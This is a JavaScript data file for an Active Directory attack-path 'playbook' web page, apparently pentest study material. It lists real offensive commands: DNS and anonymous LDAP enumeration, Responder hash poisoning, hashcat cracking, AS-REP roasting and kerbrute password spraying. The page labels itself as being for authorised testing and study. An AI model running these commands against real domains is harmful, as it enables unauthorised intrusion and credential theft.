/*
  AD ATTACK PATH v2 — data for ad-map-v2.html

  A guided "playbook" view: colour-coded ACCESS SECTIONS you expand, each
  holding TECHNIQUE buttons you expand, each showing a short description, a
  Theory/CVE link, the relevant commands, and optional "move to" links that
  jump you to another (differently-coloured) section when your access changes.

  MODEL
    meta      title / version / note
    sections[]  {
      id        unique slug (used by moveTo targets + deep links)
      title     shown on the section header
      color     the section's unique colour (hex) — drives all its tinting
      tag       optional short label on the header (e.g. "Start", "Foothold")
      desc      one-line "where you are" summary
      techniques[] {
        id      unique slug within the page
        title   button label
        theory  { label, url } | null     -> a Theory page
        cve     { id, url } | null         -> a CVE / advisory
        desc    short "what this does / when" description
        cmds    [ "command", ... ]         // # comments are dimmed
        moveTo  [ { section: "<section-id>", note: "when to pivot there" } ]
      }
    }

  This is the FRAMEWORK with a small sample (No Credentials, MITM, Valid User)
  so the mechanics work end-to-end. Replace / extend the data below with the
  full section + technique set — the page rebuilds itself automatically.
*/

var AD_MAP_V2 = {
  meta: {
    title: "AD Attack Path — Guided Playbook",
    version: "v2 (framework)",
    note: "For authorised testing and study only. Click a section to expand it, then a technique for its commands."
  },

  sections: [
    {
      id: "no-creds",
      title: "No Credentials",
      color: "#94a3b8",
      tag: "Start here",
      desc: "You're on the network with no domain account yet — find the domain, map it, and look for a first credential.",
      techniques: [
        {
          id: "find-dc",
          title: "Find the DC / domain",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Identify the domain name and its controllers via DNS SRV records and SMB before anything else.",
          cmds: [
            "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
            "nxc smb <ip_range>   # banner shows the domain + DC name"
          ],
          moveTo: []
        },
        {
          id: "zone-transfer",
          title: "Zone transfer / DNS",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Try an AXFR and pull DNS records to map internal hostnames and services.",
          cmds: [
            "dig AXFR <domain> @<dns_server>   # if zone transfer is allowed"
          ],
          moveTo: []
        },
        {
          id: "enum-ldap",
          title: "Enumerate LDAP (anonymous)",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "A null/anonymous bind can leak users, groups and the password policy — the raw material for a spray.",
          cmds: [
            "nxc ldap <dc_ip> -u '' -p '' --users --pass-pol",
            "ldapsearch -x -H ldap://<dc_ip> -b 'DC=<dc>,DC=<com>'"
          ],
          moveTo: [
            { section: "valid-user", note: "once you recover or guess a working username + password" }
          ]
        }
      ]
    },

    {
      id: "mitm",
      title: "Man in the Middle",
      color: "#60a5fa",
      tag: "Poison & relay",
      desc: "Sit between hosts and their name resolution to capture or relay authentication.",
      techniques: [
        {
          id: "llmnr",
          title: "LLMNR / NBT-NS poisoning",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Answer broadcast name-resolution requests to capture NetNTLMv2 hashes to crack offline.",
          cmds: [
            "responder -I <interface> -wv   # capture NetNTLMv2",
            "hashcat -m 5600 netntlmv2.txt wordlist.txt"
          ],
          moveTo: [
            { section: "valid-user", note: "after cracking a captured hash into a cleartext password" }
          ]
        }
      ]
    },

    {
      id: "valid-user",
      title: "Valid User",
      color: "#38bdf8",
      tag: "Have a credential",
      desc: "You hold at least one valid domain credential — now roast, spray and enumerate deeper.",
      techniques: [
        {
          id: "asreproast",
          title: "AS-REP Roasting",
          theory: { label: "AS-REP Roasting", url: "theory/2026-08-18-asrep-roasting.html" },
          cve: null,
          desc: "Accounts with Kerberos pre-auth disabled hand you a crackable AS-REP without needing their password.",
          cmds: [
            "GetNPUsers.py <domain>/<user>:'<pass>' -request -format hashcat",
            "hashcat -m 18200 asrep.txt wordlist.txt"
          ],
          moveTo: []
        },
        {
          id: "pw-spray",
          title: "Password spraying",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Spray one common password across the user list (respecting lockout) to land more accounts.",
          cmds: [
            "kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt '<Season2026!>'"
          ],
          moveTo: []
        }
      ]
    }
  ]
};
